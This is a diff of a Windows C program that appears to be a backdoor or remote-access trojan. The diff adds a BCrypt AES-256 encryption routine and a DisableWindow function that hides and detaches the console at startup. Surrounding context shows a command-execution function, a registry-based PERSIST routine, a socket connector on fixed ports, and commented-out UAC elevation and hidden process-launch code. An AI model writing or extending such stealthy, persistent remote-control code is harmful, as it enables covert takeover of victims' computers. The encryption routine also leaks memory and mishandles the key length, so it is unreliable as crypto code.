@@ -5,6 +5,7 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 
 #include <windows.h>
+#include <bcrypt.h>
 #include <string.h>
 #include <stdlib.h>
 #include <stdio.h>
@@ -14,8 +15,6 @@
 #include <openssl/applink.c>
 
 #include "base64.h"
-
-#pragma comment (lib, "Ws2_32.lib")
 
 #define SVPORT 8008
 #define CLPORT 8009
@@ -51,6 +50,48 @@
 //     size_t newLen = strlen(*dest) + strlen(src) + 1;
 //     *dest = realloc(*dest, newLen);
 //     strcat(*dest, src);
+// }
+
+// void ELEVATE()
+// {
+//     if(IsUserAdmin())
+//     {
+//         printf("alr admin\n");
+//         return;
+//     }
+//
+//     char path[MAX_PATH];
+//     HMODULE hModule = GetModuleHandle(NULL);
+//     GetModuleFileName(hModule, path, MAX_PATH);
+//
+//     SHELLEXECUTEINFO sei;
+//     sei.cbSize = sizeof(sei);
+//     sei.lpVerb = "runas";
+//     sei.lpFile = path;
+//     sei.nShow = SW_SHOWNORMAL;
+//     sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+//
+//     if(!ShellExecuteEx(&sei))
+//     {
+//         printf("ShellExecuteEx Failed: %lu\n", GetLastError());
+//         return;
+//     }
+// }
+
+// void EXECCOMMWOO(char *command)
+// {
+//     STARTUPINFO si;
+//     PROCESS_INFORMATION pi;
+//
+//     ZeroMemory(&si, sizeof(si));
+//     si.cb = sizeof(si);
+//     ZeroMemory(&pi, sizeof(pi));
+//
+//     CreateProcess(NULL, command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+//     WaitForSingleObject(pi.hProcess, INFINITE);
+//
+//     CloseHandle(pi.hProcess);
+//     CloseHandle(pi.hThread);
 // }
 
 void sendall(int sockfd, unsigned char* buffer, size_t length)
@@ -109,47 +150,74 @@ int decryptAES(unsigned char* ciphertext, int ciphertextLen, unsigned char* key,
     return plaintextLen;
 }
 
-// void ELEVATE()
-// {
-//     if(IsUserAdmin())
-//     {
-//         printf("alr admin\n");
-//         return;
-//     }
-//
-//     char path[MAX_PATH];
-//     HMODULE hModule = GetModuleHandle(NULL);
-//     GetModuleFileName(hModule, path, MAX_PATH);
-//
-//     SHELLEXECUTEINFO sei;
-//     sei.cbSize = sizeof(sei);
-//     sei.lpVerb = "runas";
-//     sei.lpFile = path;
-//     sei.nShow = SW_SHOWNORMAL;
-//     sei.fMask = SEE_MASK_NOCLOSEPROCESS;
-//
-//     if(!ShellExecuteEx(&sei))
-//     {
-//         printf("ShellExecuteEx Failed: %lu\n", GetLastError());
-//         return;
-//     }
-// }
+//FREE THE MEMORY
+int AES256_CBC_Encrypt_CNG(unsigned const* plaintext, unsigned char* key, unsigned char* iv, unsigned char* ciphertext)
+{
+    BCRYPT_ALG_HANDLE hAesAlg = NULL;
+	BCRYPT_KEY_HANDLE hKey  = NULL;
+    DWORD cbCiphertext = 0,
+        cbPlaintext = 0,
+        cbData = 0,
+        cbKeyObject = 0,
+        cbBlockLen = 0,
+        cbBlob = 0;
+    PBYTE pbCiphertext = NULL,
+		pbPlaintext = NULL,
+		pbKeyObject = NULL,
+		pbIV = NULL,
+		pbBlob = NULL;
 
-// void EXECCOMMWOO(char *command)
-// {
-//     STARTUPINFO si;
-//     PROCESS_INFORMATION pi;
-//
-//     ZeroMemory(&si, sizeof(si));
-//     si.cb = sizeof(si);
-//     ZeroMemory(&pi, sizeof(pi));
-//
-//     CreateProcess(NULL, command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-//     WaitForSingleObject(pi.hProcess, INFINITE);
-//
-//     CloseHandle(pi.hProcess);
-//     CloseHandle(pi.hThread);
-// }
+    BCryptOpenAlgorithmProvider(&hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
+	BCryptGetProperty(hAesAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbData, 0);
+	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
+    BCryptGetProperty(hAesAlg, BCRYPT_BLOCK_LENGTH, (PBYTE)&cbBlockLen, sizeof(DWORD), &cbData, 0);
+    pbIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbBlockLen);
+    memcpy(pbIV, iv, cbBlockLen);
+    BCryptSetProperty(hAesAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+    BCryptGenerateSymmetricKey(hAesAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, strlen(key), 0);
+    BCryptExportKey(hKey, NULL, BCRYPT_OPAQUE_KEY_BLOB, NULL, 0, &cbBlob, 0);
+    pbBlob = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbBlob);
+    BCryptExportKey(hKey, NULL, BCRYPT_OPAQUE_KEY_BLOB, pbBlob, cbBlob, &cbBlob, 0);
+    cbPlaintext = strlen(plaintext);
+    pbPlaintext = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlaintext);
+    memcpy(pbPlaintext, plaintext, strlen(plaintext));
+    BCryptEncrypt(hKey, pbPlaintext, cbPlaintext, NULL, pbIV, cbBlockLen, NULL, 0, &cbCiphertext, BCRYPT_BLOCK_PADDING);    
+    pbCiphertext = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCiphertext);
+    BCryptEncrypt(hKey, pbPlaintext, cbPlaintext, NULL, pbIV, cbBlockLen, pbCiphertext, cbCiphertext, &cbData, BCRYPT_BLOCK_PADDING);
+    //pbCiphertext contains the ciphertext, cbCiphertext contains the length of the ciphertext
+    //use HeapFree(GetProcessHeap(), 0, pbCiphertext) to free ciphertext after using
+    
+    //Swapping cbCiphertext to free it
+    int ciphertextLen = cbCiphertext;
+
+    //After encryption cleanup
+    if (hAesAlg)
+    {
+        BCryptCloseAlgorithmProvider(hAesAlg, 0);
+    }
+
+    if (hKey)
+    {
+        BCryptDestroyKey(hKey);
+    }
+
+    if (pbPlaintext)
+    {
+        HeapFree(GetProcessHeap(), 0, pbPlaintext);
+    }
+
+    if (pbKeyObject)
+    {
+        HeapFree(GetProcessHeap(), 0, pbKeyObject);
+    }
+
+    if (pbIV)
+    {
+        HeapFree(GetProcessHeap(), 0, pbIV);
+    }
+
+    return ciphertextLen;
+}
 
 char* ExecuteCommand(char* command, size_t* resultLen)
 {
@@ -229,21 +297,21 @@ void PERSIST()
     RegCloseKey(hKey);
 }
 
-//APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdLine, int nCmdShow)
-int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdLine, int nCmdShow)
+void DisableWindow()
 {
     HWND hWindow = GetConsoleWindow();
     ShowWindow(hWindow, SW_HIDE);
 
-
     DWORD pId = GetCurrentProcessId();
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pId);
-    if (hProcess == NULL)
-    {
-        printf("OpenProcess failed with error %lu\n", GetLastError());
-        return 1;
-    }
+    
     FreeConsole();
+}
+
+//APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdLine, int nCmdShow)
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdLine, int nCmdShow)
+{
+    DisableWindow();
     
     //SOCKET CONNECTOR
     WSADATA wsaData;
